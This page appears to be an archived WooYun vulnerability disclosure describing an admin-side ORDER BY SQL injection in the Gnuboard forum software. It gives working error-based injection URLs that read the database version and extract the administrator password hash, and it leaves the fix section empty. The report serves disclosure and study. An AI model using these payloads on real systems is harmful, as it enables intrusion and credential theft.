@@ -1,0 +1,163 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Gnuboard Injection Vulnerabilities  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Gnuboard Injection Vulnerabilities  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/路人甲">路人甲</a> 
+</li><li>提交时间：		2013-01-23 10:55</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-23：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-01-23：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">kr比较流行的bbs。只是后台注入思密达～</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">此注入属于order by后的注入。可通过order by a,(select语句)执行。此时，括号内的select语句仅当做一个子查询进行使用，当语句语法正确时返回正常页面，无法获取数据。<br />
+<br />
+此时我们可以使用mysql报错注入来获取数据。如：<br />
+<br />
+http://127.0.0.1/gnuboard/adm/member_list.php?sst=mb_intercept_date,((select+1+from+(select+count(*),concat((select version()),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)&gt;0)<br />
+<br />
+获取管理员密码：<br />
+<br />
+http://127.0.0.1/gnuboard/adm/member_list.php?sst=mb_intercept_date,((select+1+from+(select+count(*),concat((select mb_password from g4_member limit 0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)&gt;0)<br />
+<br />
+当执行以上语句的时候，错误提示为：<br />
+<br />
+1242 : Subquery returns more than 1 row<br />
+<br />
+原因：此语句默认读取长度为65位，而mb_password为varchar类型，长度为255。此时我们使用substr()函数来限制读取长度。即：substr(mb_password,1,55)<br />
+<br />
+即可获取管理密码。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/路人甲" title="路人甲">路人甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-017698" title="Gnuboard Injection Vulnerabilities">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="17698";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
